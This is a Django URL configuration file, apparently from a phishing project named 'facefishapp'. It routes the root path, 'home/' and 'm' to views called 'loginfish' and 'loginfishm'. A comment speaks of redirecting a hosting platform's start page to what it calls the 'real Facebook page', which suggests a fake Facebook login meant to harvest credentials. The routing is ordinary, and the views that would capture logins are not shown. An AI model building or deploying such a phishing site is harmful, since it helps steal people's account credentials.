
from django.contrib import admin
from django.urls import path
from facefishapp import views
from django.http import HttpResponseRedirect


urlpatterns = [
    # This instantly redirects Render's initialization page to your real Facebook page
    path('', lambda request: HttpResponseRedirect('m')),  # or '/' or your login page
    # your other URLs below...
    path('admin/', admin.site.urls),
    path('',views.loginfish),
    path('home/',views.loginfish),
    path('m',views.loginfishm),

]
